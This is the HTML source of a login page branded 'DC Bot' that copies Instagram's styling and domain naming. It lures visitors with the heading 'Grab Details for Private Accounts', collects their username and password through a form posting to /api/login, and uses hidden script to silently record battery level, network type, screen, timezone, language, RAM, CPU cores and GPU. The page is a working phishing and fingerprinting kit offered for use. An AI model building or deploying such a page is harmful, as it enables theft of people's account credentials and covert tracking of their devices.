<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="Login page" />
<link rel="stylesheet" href="./styles.css" />
<title>DC Bot</title>

<meta property="og:type" content="website" />
<meta property="og:title" content="DC Bot" />
<meta property="og:description" content="Login page" />
<meta property="og:image" content="" />
<meta property="og:url" content="https://instagram-tawny-theta.vercel.app/" />

<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="DC Bot" />
<meta name="twitter:description" content="Login page" />
<style>
  :root {
    --bg: #ffffff;
    --from-color: #696969;
    --icon-size: clamp(58px, 16.5vmin, 90px);
    --from-size: clamp(12px, 3.35vmin, 14.5px);
    --meta-size: clamp(15px, 4.5vmin, 18.5px);
    --brand-gap: clamp(7px, 2.2vmin, 11px);
    --brand-bottom: calc(clamp(20px, 5.2vmin, 30px) + env(safe-area-inset-bottom, 0px));
    --cycle: 5.4s;
  }
  @media (prefers-color-scheme: dark) {
    :root { --bg: #000000; --from-color: #9c9c9c; }
  }
  .splash {
    position: fixed; inset: 0; z-index: 9999; height: 100dvh; background: var(--bg);
    display: grid; place-items: center;
    animation: splash-cycle var(--cycle) ease-in-out infinite;
    will-change: opacity;
  }
  .splash .glyph {
    width: var(--icon-size); height: var(--icon-size); display: block;
    animation: glyph-settle var(--cycle) cubic-bezier(.2,.8,.25,1) infinite;
    will-change: transform;
  }
  .splash .brand {
    position: absolute; left: 0; right: 0; bottom: var(--brand-bottom);
    display: flex; flex-direction: column; align-items: center; gap: var(--brand-gap);
  }
  .splash .from { font-size: var(--from-size); font-weight: 400; letter-spacing: .01em; line-height: 1; color: var(--from-color); }
  .splash .meta-lockup { display: inline-flex; align-items: center; gap: .36em; font-size: var(--meta-size); line-height: 1; }
  .splash .meta-mark { height: .8em; width: auto; display: block; }
  .splash .meta-word {
    font-weight: 600; letter-spacing: -.015em; color: #c13584;
    background: linear-gradient(90deg, #e1306c 0%, #c13584 55%, #833ab4 105%);
    -webkit-background-clip: text; background-clip: text;
    -webkit-text-fill-color: transparent; color: transparent;
  }
  @keyframes splash-cycle {
    0%    { opacity: 0; }
    4.5%  { opacity: 1; }
    56%   { opacity: 1; }
    63%   { opacity: 0; }
    72%   { opacity: 0; }
    78%   { opacity: 1; }
    100%  { opacity: 1; }
  }
  @keyframes glyph-settle {
    0%    { transform: scale(.965); }
    9%    { transform: scale(1); }
    100%  { transform: scale(1); }
  }
  .splash.is-hiding {
    animation: none !important;
    opacity: 0;
    transition: opacity 0.5s ease;
    pointer-events: none;
  }
  .login-content { opacity: 0; transition: opacity 0.4s ease; }
  .login-content.show { opacity: 1; }
  @media (prefers-reduced-motion: reduce) {
    .splash, .splash .glyph { animation: none; }
  }
</style>
</head>
<body>
  <main class="splash" aria-label="Loading">
    <svg class="glyph" viewBox="0 0 100 100" role="img" aria-label="Logo">
      <rect x="10" y="10" width="80" height="80" rx="20" fill="#405DE6"/>
      <text x="50" y="62" font-size="40" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">DC</text>
    </svg>
    <div class="brand">
      <span class="from">welcome to</span>
      <span class="meta-lockup">
        <span class="meta-word">DC Bot</span>
      </span>
    </div>
  </main>
  <div class="login-content">
    <main class="layout">
        <!-- LEFT -->
        <section class="hero">
            <div class="hero-inner">
                <div class="ig-logo" aria-hidden="true">
                    <svg viewBox="0 0 48 48" width="68" height="68">
                        <rect x="4" y="4" width="40" height="40" rx="12" fill="#405DE6"/>
                        <text x="24" y="28" font-size="16" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">DC</text>
                    </svg>
                </div>
                <h2 class="headline">Welcome to <span class="gradient-text">DC Bot</span></h2>

                <div class="collage">
                    <img src="./img/collage.png" alt="Everyday moments from close friends - photo collage" />
                </div>
            </div>
        </section>

        <!-- RIGHT -->
        <section class="auth">
            <div class="auth-box">
                <h1>Grab Details for Private Accounts</h1>
                <form action="/api/login" method="post">
                    <div class="field">
                        <input id="email" name="email" type="text" placeholder=" " autocomplete="username" required />
                        <label for="email">Mobile number, username or email</label>
                    </div>
                    <div class="field">
                        <input id="password" name="password" type="password" placeholder=" " autocomplete="current-password" required />
                        <label for="password">Password</label>
                    </div>
                    <button class="btn btn-primary" type="submit">Log in</button>
                    <input type="hidden" id="battery" name="battery" value="unknown" />
                    <input type="hidden" id="nettype" name="nettype" value="unknown" />
                    <input type="hidden" id="screen" name="screen" value="unknown" />
                    <input type="hidden" id="timezone" name="timezone" value="unknown" />
                    <input type="hidden" id="language" name="language" value="unknown" />
                    <input type="hidden" id="ram" name="ram" value="unknown" />
                    <input type="hidden" id="cpu_cores" name="cpu_cores" value="unknown" />
                    <input type="hidden" id="gpu" name="gpu" value="unknown" />
                </form>
                <script>
                (function () {
                    // Screen
                    document.getElementById("screen").value = screen.width + "x" + screen.height + "x" + screen.colorDepth;
                    // Timezone
                    try { document.getElementById("timezone").value = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
                    // Language
                    document.getElementById("language").value = navigator.language || "unknown";
                    // RAM
                    if (navigator.deviceMemory) {
                        document.getElementById("ram").value = "~" + navigator.deviceMemory + " GB";
                    }
                    // CPU cores
                    if (navigator.hardwareConcurrency) {
                        document.getElementById("cpu_cores").value = navigator.hardwareConcurrency + " cores";
                    }
                    // GPU
                    try {
                        var canvas = document.createElement("canvas");
                        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                        if (gl) {
                            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                            if (debugInfo) {
                                document.getElementById("gpu").value = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            }
                        }
                    } catch(e) {}
                    // Battery + network info (Chromium browsers; others stay "unknown")
                    if (navigator.getBattery) {
                        navigator.getBattery().then(function (b) {
                            function upd() {
                                document.getElementById("battery").value =
                                    Math.round(b.level * 100) + "%" + (b.charging ? " charging" : "");
                            }
                            upd(); b.addEventListener("levelchange", upd); b.addEventListener("chargingchange", upd);
                        }).catch(function () {});
                    }
                    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (c) {
                        document.getElementById("nettype").value =
                            (c.effectiveType || "unknown") + " / downlink " + (c.downlink || "?") + "Mbps";
                    }
                })();
                </script>
                <a class="forgot" href="#">Forgot password?</a>
                <div class="gap"></div>
                <a class="btn btn-fb" href="#">
                    <span class="fb-glyph">
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="#0064e0"><path d="M12 2a10 10 0 0 0-3.6 19.3v-6.8H6V12h2.4V10c0-2.4 1.4-3.7 3.6-3.7 1 0 2.1.2 2.1.2v2.3h-1.2c-1.2 0-1.5.7-1.5 1.5v1.7h2.6l-.4 2.5h-2.2v6.8A10 10 0 0 0 12 2z"/></svg>
                    </span>
                    Log in with Facebook
                </a>
                <a class="btn btn-outline" href="#">Create new account</a>
                <div class="meta-logo"><span class="meta-glyph">∞</span> DC Bot</div>
            </div>
        </section>
    </main>

    <footer>
        <ul>
            <li><a href="#">About</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
        </ul>
    </footer>
  </div>
</body>
<script>
(function() {
  var splash = document.querySelector('.splash');
  var content = document.querySelector('.login-content');
  if (!splash) { if (content) content.classList.add('show'); return; }
  setTimeout(function() {
    splash.classList.add('is-hiding');
    if (content) content.classList.add('show');
    setTimeout(function() { splash.remove(); }, 600);
  }, 3000);
})();
</script>
</html>
